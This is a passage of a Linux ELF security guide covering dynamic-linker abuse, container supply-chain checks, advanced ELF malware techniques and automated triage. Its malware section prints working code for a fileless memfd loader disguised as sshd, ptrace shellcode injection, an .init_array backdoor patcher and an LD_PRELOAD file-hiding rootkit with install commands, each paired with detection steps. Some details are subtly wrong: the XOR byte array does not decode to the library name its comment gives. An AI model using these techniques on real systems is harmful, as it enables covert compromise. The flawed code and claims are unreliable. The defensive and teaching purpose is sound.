# Detection: find setuid binaries with hard links in unusual locations
find / -perm -4000 -links +1 -type f 2>/dev/null | \
    while read f; do
        find / -samefile "$f" 2>/dev/null | grep -v "^$f$"
    done

# Detection: audit LD_AUDIT usage in process environments
# (auditd rule)
# -a always,exit -F arch=b64 -S execve -F key=exec_audit
# Then grep audit logs for LD_AUDIT in the environment
```

**Fix.** Glibc patched `$ORIGIN` expansion to refuse operation under `AT_SECURE` and added `LD_AUDIT` to the unsecure_envvars list. Modern distributions also prevent hard-linking to setuid binaries via `fs.protected_hardlinks=1` (default since kernel 3.6).

### 21.6 RTLD_GLOBAL and namespace pollution

When a shared object is loaded with `dlopen("libfoo.so", RTLD_GLOBAL)`, its exported symbols are added to the global symbol scope. Any subsequent symbol lookup in any loaded object can resolve to symbols in `libfoo.so`. This is the dynamic-linking equivalent of namespace pollution: a library loaded by one plugin becomes visible to all plugins, potentially shadowing (interposing) functions in unrelated libraries.

The security implications:

**Unintentional interposition.** If `libfoo.so` exports a symbol named `connect` and is loaded with `RTLD_GLOBAL`, every subsequent call to `connect()` in any library may resolve to `libfoo.so`'s version instead of libc's. This can redirect network calls through attacker-controlled code if the attacker can influence which DSOs are loaded (e.g., via a plugin directory).

**Namespace isolation failure.** `RTLD_LOCAL` (the default for `dlopen`) confines a library's symbols to lookups that explicitly traverse its scope. But libraries loaded by a `RTLD_GLOBAL` DSO inherit its scope, creating transitive exposure. A deeply nested dependency loaded as `RTLD_GLOBAL` can pollute the entire process namespace.

```c
/* Demonstrate namespace pollution */
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>

int main(void)
{
    /* Load a plugin that exports 'write' — shadows libc's write() */
    void *h = dlopen("./evil_plugin.so", RTLD_NOW | RTLD_GLOBAL);
    if (!h) { fprintf(stderr, "dlopen: %s\n", dlerror()); return 1; }

    /* This write() call now resolves to evil_plugin's write() */
    write(STDOUT_FILENO, "Hello?\n", 7);

    /* Detection: enumerate the global scope */
    /* Use dl_iterate_phdr or LD_DEBUG=bindings to see where symbols resolve */
    dlclose(h);
    return 0;
}
```

```bash
# Detect RTLD_GLOBAL usage in a binary or library
objdump -d ./target | grep -B5 'dlopen' | grep -i 'RTLD_GLOBAL\|0x100'
# RTLD_GLOBAL = 0x00100 on Linux; look for the flag in the second argument

# Runtime detection via LD_DEBUG
LD_DEBUG=bindings ./target 2>&1 | grep 'binding.*evil_plugin'
```

**Mitigation.** Default to `RTLD_LOCAL` for all `dlopen` calls. Use `RTLD_GLOBAL` only when explicit cross-library symbol sharing is required (e.g., Python extension modules that must share the Python runtime). For plugin architectures, load each plugin with `RTLD_LOCAL | RTLD_NOW` and communicate through explicit function-pointer tables, not symbol interposition.

### 21.7 dlopen/dlsym abuse patterns and detection

`dlopen` and `dlsym` provide legitimate runtime symbol resolution. They are also the primary mechanism for malware to resolve function addresses without static imports — the ELF equivalent of `GetProcAddress` on Windows.

**Pattern 1: Avoiding import table visibility.** Instead of calling `system()` directly (which creates a `.dynsym` entry visible to static analysis), malware resolves it at runtime:

```c
#include <dlfcn.h>
typedef int (*system_fn)(const char *);

void payload(void)
{
    void *libc = dlopen("libc.so.6", RTLD_NOW);
    system_fn sys = (system_fn)dlsym(libc, "system");
    sys("/bin/sh");
    dlclose(libc);
}
```

This binary's `.dynsym` shows `dlopen` and `dlsym` but not `system`. Static analysis tools that check only the import table miss the `system()` call entirely.

**Pattern 2: String obfuscation.** Malware XORs or base64-encodes the library and function names to evade string scanning:

```c
/* Deobfuscate at runtime */
char lib[] = {0x6e, 0x6b, 0x62, 0x63, 0x2f, 0x74, 0x70, 0x2f, 0x37, 0};
for (int i = 0; lib[i]; i++) lib[i] ^= 0x5;
/* lib is now "libc.so.6" after XOR */
void *h = dlopen(lib, RTLD_NOW);
```

**Pattern 3: Resolving syscall wrappers.** Advanced malware skips libc entirely and resolves `syscall()` or raw syscall numbers, but less sophisticated implants use `dlsym` to resolve `execve`, `fork`, `mmap`, and `mprotect` for shellcode injection.

**Detection heuristics:**

```bash
# Static: check for dlopen/dlsym imports (strong signal when combined with
# absence of expected function imports)
readelf -d ./suspect | grep NEEDED
# If only libc.so.6 is listed but the binary does complex operations:
nm -D ./suspect | grep -E 'dlopen|dlsym'
# Presence of dlopen/dlsym + absence of expected imports = suspicious

# Static: search for obfuscated strings near dlopen call sites
objdump -d ./suspect | grep -A20 'call.*dlopen' | grep -E 'xor|mov.*0x[0-9a-f]{2},'
# XOR loops near dlopen calls suggest string deobfuscation

# Runtime: trace dlopen/dlsym calls
LD_DEBUG=bindings,libs ./suspect 2>&1 | grep -E 'dlopen|binding'
# Or via ltrace
ltrace -e 'dlopen+dlsym' ./suspect 2>&1
```

```
rule elf_dlsym_without_expected_imports {
    meta:
        description = "ELF uses dlopen/dlsym but lacks expected libc function imports"
        severity = "medium"
        technique = "T1106 - Native API"
    strings:
        $dlopen = "dlopen"
        $dlsym  = "dlsym"
        $system = "system"
        $execve = "execve"
        $popen  = "popen"
    condition:
        uint32(0) == 0x464c457f and
        ($dlopen or $dlsym) and
        not ($system or $execve or $popen)
}
```

---

## 22. ELF in container and cloud environments

Containers package ELF binaries into minimal filesystem layers, often stripping the tooling (shell, coreutils, package managers) that forensic analysts rely on. Cloud-native builds introduce supply chain integrity requirements — knowing that a binary has not been tampered with between build and deployment — that traditional ELF analysis does not address. This section covers the ELF-specific aspects of these environments.

### 22.1 Distroless container ELF analysis

Distroless images (e.g., `gcr.io/distroless/base-debian12`) contain only the application binary, its shared libraries, and essential runtime files. There is no shell, no package manager, and no `readelf`. Forensic analysis must happen externally.

**Extracting binaries from an OCI image layer:**

```bash
# Pull and save the image as a tarball
docker save myapp:latest -o myapp.tar

# List layers
tar tf myapp.tar | grep layer.tar
# Output: abc123/layer.tar, def456/layer.tar, ...

# Extract a specific layer to find the application binary
mkdir /tmp/layer_extract
tar xf myapp.tar -C /tmp/layer_extract
for layer in /tmp/layer_extract/*/layer.tar; do
    echo "=== $layer ==="
    tar tf "$layer" | grep -E '\.so(\.|$)|bin/'
done

# Extract the binary for analysis
tar xf /tmp/layer_extract/abc123/layer.tar -C /tmp/layer_extract/ ./app/server
readelf -h /tmp/layer_extract/app/server
readelf -d /tmp/layer_extract/app/server
```

**Ephemeral debug container for live analysis:**

```bash
# Attach a debug container to a running distroless pod (Kubernetes)
kubectl debug -it mypod --image=ubuntu:24.04 --target=mycontainer -- bash

# Inside the debug container, access the target's filesystem via /proc
ls /proc/1/root/app/
readelf -l /proc/1/root/app/server

# Dump the process's loaded libraries
cat /proc/1/maps | grep '\.so'

# Copy the binary out for offline analysis
cp /proc/1/root/app/server /tmp/
checksec --file=/tmp/server
```

### 22.2 Static vs dynamic linking security tradeoffs

Container environments force a concrete decision between static and dynamic linking, with security implications on both sides:

**Statically-linked binaries** (common in Go, Rust, and C with musl libc):

| Advantage | Disadvantage |
|-----------|--------------|
| No dependency on host libraries; immune to library substitution | Vulnerability in a statically-linked library requires rebuilding and redeploying every binary that includes it |
| No dynamic linker attack surface (§21.1–§21.5 are irrelevant) | No ASLR of library code relative to the main binary (all code at fixed offsets within the executable) |
| Simpler container images; smaller attack surface | Binary size increases; every copy of libc's `printf` is a separate code instance |
| No `LD_PRELOAD`-based instrumentation or interposition possible | Cannot use `LD_PRELOAD`-based security tools (e.g., `libseccomp`, `tcmalloc` injection) |

**Dynamically-linked binaries** (common in C/C++ with glibc):

| Advantage | Disadvantage |
|-----------|--------------|
| Library updates fix all binaries simultaneously | Container must ship compatible shared libraries; version skew causes runtime failures |
| ASLR randomizes each library independently | Dynamic linker is a high-value attack surface |
| `LD_PRELOAD` instrumentation available for monitoring/hardening | Library substitution attacks possible if mount points are writable |

```bash
# Determine linking strategy for a binary
file ./server
# Static: "statically linked"
# Dynamic: "dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2"

# For dynamic binaries, enumerate all dependencies recursively
ldd ./server 2>/dev/null || /lib64/ld-linux-x86-64.so.2 --list ./server

# For static binaries, check which libraries were linked in
strings ./server | grep -i 'glibc\|musl\|libc' | head -5
# Go binaries embed their own runtime; check:
go version ./server 2>/dev/null
```

**Recommendation for security-critical containers:** Prefer static linking with musl libc for network-facing services where the dynamic linker attack surface is a concern. Pair with a rebuild pipeline that triggers on CVEs in any statically-included library. For binaries that must be dynamically linked, use distroless base images with read-only library mounts and Full RELRO.

### 22.3 Supply chain integrity for ELF artifacts

Supply chain attacks target the build-to-deploy pipeline: a compromised build system, dependency, or registry can substitute a trojanized binary without the deployer's knowledge. The defenses operate at three layers: reproducible builds (bit-identical output from the same source), SBOMs (inventorying what went into the binary), and signing (cryptographic proof of provenance).

**Reproducible builds verification:**

```bash
# Build the same source twice and compare
docker build --no-cache -t myapp:build1 .
docker build --no-cache -t myapp:build2 .

# Extract the binary from each build
docker create --name b1 myapp:build1 && docker cp b1:/app/server /tmp/server1
docker create --name b2 myapp:build2 && docker cp b2:/app/server /tmp/server2

# Binary diff — must be identical for reproducible builds
sha256sum /tmp/server1 /tmp/server2
diff <(readelf -a /tmp/server1) <(readelf -a /tmp/server2)

# Common reproducibility breakers in ELF:
# - Embedded timestamps (check with: readelf -n /tmp/server1 | grep -i time)
# - Build paths in debug info (check: strings /tmp/server1 | grep '/home/')
# - Non-deterministic section ordering
# - Go's build ID (go build -trimpath -ldflags="-buildid=" to suppress)
```

**SBOM generation with syft:**

```bash
# Generate an SBOM for a container image (CycloneDX format)
syft packages docker:myapp:latest -o cyclonedx-json > sbom.json

# Generate an SBOM for a single ELF binary (inspects embedded packages)
syft file:/tmp/server -o spdx-json > sbom_binary.json

# Scan the SBOM for known vulnerabilities
grype sbom:sbom.json --output json > vulns.json

# Direct vulnerability scan of a container image
grype docker:myapp:latest --only-fixed --output table
```

**Vulnerability scanning with trivy:**

```bash
# Scan a container image for OS-package and library vulnerabilities
trivy image --severity HIGH,CRITICAL myapp:latest

# Scan a local binary's linked libraries
trivy fs --scanners vuln /tmp/layer_extract/

# Scan for misconfigurations in Dockerfiles
trivy config ./Dockerfile
```

### 22.4 ELF signing and verification

ELF binaries lack an intrinsic signing mechanism (unlike PE's Authenticode). External signing frameworks fill this gap.

**sigstore/cosign for container image signing:**

```bash
# Sign a container image (keyless, using OIDC identity)
cosign sign --yes myregistry.io/myapp:latest

# Verify the signature before deployment
cosign verify myregistry.io/myapp:latest \
    --certificate-identity="cicd@example.com" \
    --certificate-oidc-issuer="https://accounts.google.com"

# Verify in a Kubernetes admission controller (policy-controller / Kyverno)
# The admission webhook rejects unsigned images at deploy time
```

**Linux kernel module signing** (for kernel-loadable ELF objects):

```bash
# Sign a kernel module
/usr/src/linux-headers-$(uname -r)/scripts/sign-file \
    sha256 \
    /path/to/signing_key.pem \
    /path/to/signing_cert.pem \
    ./mymodule.ko

# Verify the signature
modinfo ./mymodule.ko | grep -i sig
# sig_id, signer, sig_key, sig_hashalgo fields should be populated

# Enforce module signature verification
# In /etc/default/grub or kernel cmdline:
# module.sig_enforce=1
# Unsigned modules will be rejected at load time
```

**IMA/EVM for individual ELF signing:**

```bash
# Sign an ELF binary with IMA (Integrity Measurement Architecture)
evmctl ima_sign --key /etc/keys/privkey_evm.pem /usr/bin/myapp

# Verify at execution time (kernel IMA policy)
# /etc/ima/ima-policy:
# dont_appraise fsmagic=0x9fa0
# dont_appraise fsmagic=0x62656572
# appraise func=BPRM_CHECK fowner=0 appraise_type=imasig

# List IMA measurements
cat /sys/kernel/security/ima/ascii_runtime_measurements | head
```

---

## 23. Advanced ELF malware techniques

This section covers offensive techniques that go beyond the basic malware analysis patterns in §15. Where §15 focused on structural anomalies (header manipulation, PT_NOTE infection, packing), this section examines runtime execution techniques, persistence mechanisms, and rootkit patterns. Detection counterparts are provided alongside each technique.

### 23.1 ELF packers and crypters — deep identification

§15.3 covered UPX detection and basic unpacking. Beyond UPX, the Linux malware ecosystem uses custom packers and crypters that defeat signature-based identification.

**Packer identification via stub structure.** Every packer prepends or appends a decompression stub that executes before the original code. The stub's structure reveals the packer:

- **UPX:** The stub begins with a `PUSHA`/`PUSHAD`-equivalent sequence (saving all registers), followed by a tight decompression loop using NRV or LZMA, and ends with a `JMP` to the original entry point. The file contains the magic bytes `UPX!` at offset +4 from the start of the compressed data, unless the attacker has zeroed them.
- **Midori/custom ELF packers:** Often use `mmap` + `mprotect` + `memcpy` in the stub rather than inline decompression. The stub makes syscalls directly (via `syscall` instruction) to avoid libc dependencies.
- **Crypter stubs:** Decrypt the payload at runtime using XOR, RC4, or AES. The stub contains the decryption key (or derives it from environment data) and writes the cleartext to an `mmap`'d region with `PROT_READ | PROT_WRITE | PROT_EXEC`.

**Entropy analysis for packer detection:**

```python
#!/usr/bin/env python3
"""Compute per-section Shannon entropy to detect packed/encrypted ELF sections."""
import math
import sys
from elftools.elf.elffile import ELFFile

def shannon_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    freq = [0] * 256
    for byte in data:
        freq[byte] += 1
    length = len(data)
    entropy = 0.0
    for count in freq:
        if count == 0:
            continue
        p = count / length
        entropy -= p * math.log2(p)
    return entropy

def analyze_elf(path: str) -> None:
    with open(path, 'rb') as f:
        elf = ELFFile(f)
        print(f"{'Section':<20} {'Size':>10} {'Entropy':>8}  {'Verdict'}")
        print("-" * 60)
        for section in elf.iter_sections():
            data = section.data()
            if len(data) == 0:
                continue
            ent = shannon_entropy(data)
            verdict = ""
            if ent > 7.5:
                verdict = "PACKED/ENCRYPTED"
            elif ent > 6.5:
                verdict = "high entropy"
            elif ent < 1.0 and len(data) > 64:
                verdict = "suspiciously low"
            print(f"{section.name:<20} {len(data):>10} {ent:>8.4f}  {verdict}")

if __name__ == "__main__":
    analyze_elf(sys.argv[1])
```

```bash
# Quick entropy check using binwalk
binwalk -E ./suspect.elf
# Flat high-entropy regions (>7.0) across the entire binary indicate packing

# Compare entropy profiles
binwalk -E ./suspect.elf > /tmp/suspect_entropy.csv
binwalk -E /usr/bin/ls > /tmp/ls_entropy.csv
# Normal .text sections: entropy 5.5-6.5
# Compressed/encrypted: entropy 7.5-8.0
```

**Custom packer identification heuristics (beyond UPX):**

```bash
# 1. Entry point in an unusual section (packers often put stubs in .data or
#    a custom section, not .text)
readelf -h ./suspect | grep 'Entry point'
readelf -S ./suspect | grep -n 'PROGBITS.*AX'
# If entry point falls outside .text range: packer stub likely

# 2. Writable + executable segments (packer needs W+X for runtime unpacking)
readelf -l ./suspect | grep -E 'LOAD.*RWE|LOAD.*WE'
# Any RWE (read-write-execute) LOAD segment is anomalous

# 3. Minimal imports (packer stubs often import only mmap/mprotect/write or
#    use raw syscalls)
readelf -d ./suspect | grep NEEDED
nm -D ./suspect 2>/dev/null | wc -l
# A binary with <10 dynamic imports doing complex operations: likely packed

# 4. String density (packed binaries have very few readable strings)
strings -n 6 ./suspect | wc -l
# Compare against a known-clean binary of similar size
```

### 23.2 Process hollowing on Linux

Process hollowing is the technique of starting a legitimate process and replacing its memory contents with malicious code. On Windows, this uses `NtUnmapViewOfSection` + `WriteProcessMemory`. On Linux, the equivalent uses `memfd_create` + `fexecve` or direct `ptrace`-based memory replacement.

**Technique 1: memfd_create + fexecve (self-hollowing).**

The attacker creates an anonymous file in memory using `memfd_create()`, writes the malicious ELF into it, and executes it via `fexecve()`. The binary exists only in memory — no file is ever written to disk. The process's `/proc/PID/exe` symlink points to `/memfd:name (deleted)`.

```c
/* Process hollowing via memfd_create + fexecve */
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

/* malware_elf and malware_elf_len would be an embedded ELF blob */
extern unsigned char malware_elf[];
extern unsigned int  malware_elf_len;

int main(int argc, char *argv[], char *envp[])
{
    /* Create an anonymous file descriptor in memory */
    int fd = memfd_create("", MFD_CLOEXEC);
    if (fd < 0) { perror("memfd_create"); return 1; }

    /* Write the malicious ELF into the memory-backed fd */
    if (write(fd, malware_elf, malware_elf_len) != (ssize_t)malware_elf_len) {
        perror("write");
        return 1;
    }

    /* Execute the in-memory ELF — replaces this process image */
    char *fake_argv[] = { "/usr/sbin/sshd", NULL };  /* disguised name */
    fexecve(fd, fake_argv, envp);

    /* fexecve only returns on failure */
    perror("fexecve");
    return 1;
}
```

**Technique 2: ptrace-based injection into a running process.**

```c
/* Simplified: inject shellcode into a target process via ptrace */
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>
#include <string.h>

void inject(pid_t target, unsigned char *shellcode, size_t len)
{
    ptrace(PTRACE_ATTACH, target, NULL, NULL);
    waitpid(target, NULL, 0);

    /* Read the target's registers to find RIP */
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, target, NULL, &regs);

    /* Write shellcode at RIP (overwriting current instruction) */
    for (size_t i = 0; i < len; i += sizeof(long)) {
        long word = 0;
        memcpy(&word, shellcode + i,
               (len - i < sizeof(long)) ? len - i : sizeof(long));
        ptrace(PTRACE_POKETEXT, target, regs.rip + i, word);
    }

    /* Resume execution — now running the injected shellcode */
    ptrace(PTRACE_DETACH, target, NULL, NULL);
}
```

**Detection:**

```bash
# Detect memfd_create-based execution
# 1. Check /proc/PID/exe for memfd references
find /proc/*/exe -lname '*memfd*' 2>/dev/null
# Any result is a strong indicator of fileless execution

# 2. auditd rule for memfd_create syscall (syscall 319 on x86_64)
# -a always,exit -F arch=b64 -S memfd_create -F key=memfd_exec

# 3. Check for processes whose exe points to deleted files
ls -la /proc/*/exe 2>/dev/null | grep '(deleted)'

# Detect ptrace-based injection
# yama ptrace_scope restricts ptrace to parent-child relationships
cat /proc/sys/kernel/yama/ptrace_scope
# 0 = any process can ptrace any other (dangerous)
# 1 = only parent can ptrace child (default on most distros)
# 2 = only root with CAP_SYS_PTRACE
# 3 = ptrace completely disabled

# auditd rule for ptrace
# -a always,exit -F arch=b64 -S ptrace -F key=ptrace_inject
```

### 23.3 ELF binary patching for persistence

Persistent modification of on-disk ELF binaries allows an attacker to survive reboots without deploying separate malware. The key persistence targets in an ELF binary are:

**.init_array modification.** The `.init_array` section contains an array of function pointers that the dynamic linker calls before `main()`. Appending an address (or overwriting an existing entry) redirects early execution to attacker code:

```python
#!/usr/bin/env python3
"""Patch .init_array to add a backdoor constructor."""
import lief

binary = lief.parse("./target_binary")

# Find .init_array section
init_array = binary.get_section(".init_array")
if init_array is None:
    print("No .init_array section found")
    exit(1)

# The backdoor code is injected into a code cave or appended segment
# For this example, assume we've already injected code at this vaddr:
backdoor_vaddr = 0x401200

# Read current init_array entries (array of 8-byte function pointers)
current_entries = list(init_array.content)
print(f"Current .init_array size: {len(current_entries)} bytes")
print(f"Entries: {len(current_entries) // 8}")

# Append our backdoor address to .init_array
import struct
backdoor_bytes = list(struct.pack("<Q", backdoor_vaddr))
new_content = current_entries + backdoor_bytes

# Update the section (LIEF handles size adjustment)
init_array.content = new_content

binary.write("./backdoored_binary")
print(f"Wrote backdoored binary with init_array entry -> {hex(backdoor_vaddr)}")
```

**GOT poisoning for persistent function redirection.** Unlike runtime GOT overwrites (§13), this modifies the on-disk binary's `.got.plt` entries. Partial RELRO binaries have a writable GOT at runtime, but even the on-disk GOT entries can be patched if the binary uses lazy binding — the initial GOT entries point to PLT stub instructions, and patching these to point to injected code means the redirection happens on first call without needing a runtime exploit.

```bash
# Identify GOT entries in a partial-RELRO binary
readelf -r ./target | grep R_X86_64_JUMP_SLOT
# Example output:
# 0000000000404018  R_X86_64_JUMP_SLOT  0000000000000000 puts@GLIBC_2.2.5

# Read the current value at the GOT slot (lazy binding: points to PLT+6)
objdump -s -j .got.plt ./target | head -20

# Detection: compare GOT entries against expected PLT stubs
python3 -c "
import lief
b = lief.parse('./target')
for r in b.pltgot_relocations:
    got_addr = r.address
    # In lazy binding, GOT should point to PLT stub (within .plt range)
    plt = b.get_section('.plt')
    if plt:
        plt_start = plt.virtual_address
        plt_end = plt_start + plt.size
        got_value = int.from_bytes(b.get_content_from_virtual_address(got_addr, 8), 'little')
        in_plt = plt_start <= got_value <= plt_end
        print(f'{r.symbol.name}: GOT@{hex(got_addr)} -> {hex(got_value)} [PLT: {in_plt}]')
"
```

### 23.4 Linux rootkit techniques

Rootkits hide their presence by intercepting the interfaces that monitoring tools use. On Linux, the three dominant ELF-related rootkit mechanisms are LD_PRELOAD interposition, kernel syscall table hooking (via loadable kernel modules), and eBPF-based interception.

**LD_PRELOAD rootkits.** By exporting functions with the same name as libc functions, an `LD_PRELOAD` library intercepts every call to those functions in every dynamically-linked process. A rootkit targeting `readdir()` can hide files; one targeting `read()` can filter `/proc` contents; one targeting `connect()` can redirect network connections.

```c
/* Minimal LD_PRELOAD rootkit — hides files matching a prefix */
#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

#define HIDDEN_PREFIX "rootkit_"

/* Override readdir to filter out hidden files */
struct dirent *readdir(DIR *dirp)
{
    /* Resolve the real readdir from libc */
    static struct dirent *(*real_readdir)(DIR *) = NULL;
    if (!real_readdir)
        real_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    do {
        entry = real_readdir(dirp);
        if (!entry) return NULL;
    } while (strncmp(entry->d_name, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0);

    return entry;
}

/* Similarly override readdir64, open, stat, etc. for completeness */
```

```bash
# Compile and deploy (attacker perspective)
gcc -shared -fPIC -o librk.so rootkit.c -ldl
echo /path/to/librk.so >> /etc/ld.so.preload
# /etc/ld.so.preload is loaded by ld.so for ALL dynamically-linked processes

# Detection: check /etc/ld.so.preload
cat /etc/ld.so.preload 2>/dev/null
# Any content is suspicious on production systems

# Detection: compare libc function addresses across processes
# If LD_PRELOAD interposes read(), its address differs from libc's
LD_DEBUG=bindings /bin/ls 2>&1 | grep 'read' | head -5
# Look for bindings resolving to unexpected libraries

# Detection: enumerate loaded objects in a running process
cat /proc/$PID/maps | grep '\.so' | awk '{print $6}' | sort -u
# Unknown .so files loaded into all processes = rootkit

# Detection: static analysis of /etc/ld.so.preload contents
if [ -s /etc/ld.so.preload ]; then
    while IFS= read -r lib; do
        echo "=== $lib ==="
        nm -D "$lib" 2>/dev/null | grep -E ' T (read|write|open|connect|stat|readdir)'
    done < /etc/ld.so.preload
fi
# Libraries exporting libc function names = interposition rootkit
```

**Kernel module rootkits (LKM).** Loadable kernel modules are ELF relocatable objects (`ET_REL`) that the kernel links into its address space at runtime. A rootkit LKM can hook syscall table entries, modify kernel data structures (e.g., hiding processes from the task list), or intercept VFS operations.

```bash
# Detection: check for recently loaded or unusual modules
lsmod | sort
# Compare against a known-good baseline

# Detect modified syscall table (requires root)
# Read the syscall table address from /proc/kallsyms
grep sys_call_table /proc/kallsyms
# 0xffffffff82200300 R sys_call_table

# Compare syscall entry addresses against expected kernel symbol addresses
# A hooked syscall points outside the kernel text range
cat /proc/kallsyms | grep ' T .*sys_' | head -20
# If a syscall table entry points to a module address range instead of
# the kernel text range, it has been hooked

# Enforce kernel module signing to prevent unauthorized LKMs
cat /proc/sys/kernel/modules_disabled
# 1 = no new modules can be loaded (set after boot)
cat /proc/config.gz 2>/dev/null | zcat | grep MODULE_SIG
# CONFIG_MODULE_SIG_FORCE=y prevents loading unsigned modules
```

**eBPF-based rootkits.** eBPF programs attached to tracepoints, kprobes, or LSM hooks can intercept and modify kernel behavior without a traditional LKM. An eBPF rootkit can filter `getdents64` results (hiding files), modify `tcp_v4_connect` data (hiding connections), or intercept `bpf_probe_read_user` to tamper with data returned to userspace.

```bash
# Enumerate loaded eBPF programs
bpftool prog list
# Check for unexpected programs attached to security-sensitive hooks

# List eBPF program attachments
bpftool prog show | grep -E 'type|name|loaded_at'
# Programs attached to kprobes on sys_getdents64, sys_read, or
# security_* LSM hooks are suspicious

# Detailed inspection of a specific eBPF program
bpftool prog dump xlated id <PROG_ID>
bpftool prog dump jited id <PROG_ID>

# Detection: monitor bpf() syscall usage
# auditd rule:
# -a always,exit -F arch=b64 -S bpf -F key=bpf_load
# Any non-system use of bpf(BPF_PROG_LOAD) should be investigated

# Restrict unprivileged eBPF (defense)
sysctl kernel.unprivileged_bpf_disabled=1
```

---

## 24. ELF analysis automation

Manual analysis scales to individual binaries. Incident response, supply chain auditing, and fleet hardening require automated pipelines that process hundreds or thousands of ELF binaries. This section covers pipeline design, tool integration, and CI/CD embedding — extending beyond the single-binary Ghidra headless example in §18.5.

### 24.1 Automated triage pipeline

An effective triage pipeline extracts key metadata from every binary and produces a structured report. The following script performs first-pass triage: file type, architecture, linking strategy, hardening posture, suspicious strings, and import analysis.

```bash
#!/usr/bin/env bash
# elf_triage.sh — Automated ELF binary triage
# Usage: elf_triage.sh <binary_path> [output_dir]
set -euo pipefail

BINARY="${1:?Usage: $0 <binary>}"
OUTDIR="${2:-/tmp/elf_triage}"
BASENAME="$(basename "$BINARY")"
REPORT="$OUTDIR/${BASENAME}.triage.json"

mkdir -p "$OUTDIR"

# --- Basic metadata ---
FILE_TYPE="$(file -b "$BINARY")"
SHA256="$(sha256sum "$BINARY" | awk '{print $1}')"
SIZE="$(stat -c%s "$BINARY")"
ARCH="$(readelf -h "$BINARY" 2>/dev/null | grep Machine | awk -F: '{print $2}' | xargs)"
TYPE="$(readelf -h "$BINARY" 2>/dev/null | grep Type | awk -F: '{print $2}' | xargs)"
ENTRY="$(readelf -h "$BINARY" 2>/dev/null | grep 'Entry point' | awk '{print $NF}')"

# --- Linking ---
INTERP="$(readelf -l "$BINARY" 2>/dev/null | grep 'Requesting program interpreter' | \
    sed 's/.*: \(.*\)]/\1/' || echo 'static')"
NEEDED="$(readelf -d "$BINARY" 2>/dev/null | grep NEEDED | \
    awk '{print $NF}' | tr -d '[]' | paste -sd, || echo 'none')"

# --- Hardening posture ---
RELRO="$(readelf -l "$BINARY" 2>/dev/null | grep -c GNU_RELRO || echo 0)"
BIND_NOW="$(readelf -d "$BINARY" 2>/dev/null | grep -c BIND_NOW || echo 0)"
NX="$(readelf -l "$BINARY" 2>/dev/null | grep 'GNU_STACK' | grep -c 'RW ' || echo 0)"
PIE="$(echo "$TYPE" | grep -ci 'DYN' || echo 0)"
CANARY="$(nm -D "$BINARY" 2>/dev/null | grep -c '__stack_chk_fail' || echo 0)"
FORTIFY="$(nm -D "$BINARY" 2>/dev/null | grep -c '_chk@' || echo 0)"

# Determine RELRO level
if [ "$RELRO" -gt 0 ] && [ "$BIND_NOW" -gt 0 ]; then
    RELRO_LEVEL="Full"
elif [ "$RELRO" -gt 0 ]; then
    RELRO_LEVEL="Partial"
else
    RELRO_LEVEL="None"
fi

# --- Anomaly flags ---
SHOFF="$(readelf -h "$BINARY" 2>/dev/null | grep 'section header' | head -1 | awk '{print $NF}')"
NO_SECTIONS=0; [ "$SHOFF" = "0" ] && NO_SECTIONS=1
RWX_SEGS="$(readelf -l "$BINARY" 2>/dev/null | grep -c 'RWE\|RWX' || echo 0)"
UPX_MAGIC="$(grep -c 'UPX!' "$BINARY" 2>/dev/null || echo 0)"

# --- Suspicious strings ---
SUSPICIOUS_STRINGS="$(strings -n 6 "$BINARY" | \
    grep -iE '/dev/shm|/tmp/\.|memfd_create|LD_PRELOAD|/etc/ld\.so\.preload|ptrace|dlopen.*dlsym' | \
    head -20 | paste -sd'|' || echo 'none')"

# --- Dynamic symbol imports of interest ---
SECURITY_IMPORTS="$(nm -D "$BINARY" 2>/dev/null | \
    grep -E ' U (execve|system|popen|fork|ptrace|mprotect|mmap|dlopen|dlsym|memfd_create)' | \
    awk '{print $NF}' | paste -sd, || echo 'none')"

# --- Write JSON report ---
cat > "$REPORT" <<EOJSON
{
  "file": "$(realpath "$BINARY")",
  "sha256": "$SHA256",
  "size_bytes": $SIZE,
  "file_type": "$FILE_TYPE",
  "architecture": "$ARCH",
  "elf_type": "$TYPE",
  "entry_point": "$ENTRY",
  "interpreter": "$INTERP",
  "needed_libraries": "$NEEDED",
  "hardening": {
    "relro": "$RELRO_LEVEL",
    "nx_stack": $([ "$NX" -gt 0 ] && echo true || echo false),
    "pie": $([ "$PIE" -gt 0 ] && echo true || echo false),
    "stack_canary": $([ "$CANARY" -gt 0 ] && echo true || echo false),
    "fortify_source": $([ "$FORTIFY" -gt 0 ] && echo true || echo false)
  },
  "anomalies": {
    "no_section_headers": $([ "$NO_SECTIONS" -gt 0 ] && echo true || echo false),
    "rwx_segments": $RWX_SEGS,
    "upx_packed": $([ "$UPX_MAGIC" -gt 0 ] && echo true || echo false)
  },
  "suspicious_strings": "$SUSPICIOUS_STRINGS",
  "security_relevant_imports": "$SECURITY_IMPORTS"
}
EOJSON

echo "[+] Triage report written to $REPORT"
```

```bash
# Batch triage across a directory
find /opt/app/bin -type f -executable | while read -r bin; do
    file "$bin" | grep -q 'ELF' && bash elf_triage.sh "$bin" /tmp/triage_results/
done

# Aggregate results (find all binaries missing hardening)
jq -r 'select(.hardening.relro != "Full" or .hardening.pie == false) |
    "\(.file): RELRO=\(.hardening.relro) PIE=\(.hardening.pie)"' \
    /tmp/triage_results/*.json
```

### 24.2 Ghidra headless batch analysis

§18.5 demonstrated single-binary Ghidra headless analysis. For fleet-scale analysis, the workflow involves processing binaries in parallel, extracting structured data (function lists, call graphs, decompiled source), and feeding results into a searchable database.

```bash
#!/usr/bin/env bash
# ghidra_batch.sh — Batch ELF analysis with Ghidra headless
set -euo pipefail

GHIDRA_HOME="${GHIDRA_HOME:-/opt/ghidra}"
INPUT_DIR="${1:?Usage: $0 <input_dir> <output_dir>}"
OUTPUT_DIR="${2:?Usage: $0 <input_dir> <output_dir>}"
PROJECT_DIR="/tmp/ghidra_batch_$$"
PROJECT_NAME="batch_analysis"

mkdir -p "$OUTPUT_DIR" "$PROJECT_DIR"

# Import all ELF binaries into a single Ghidra project
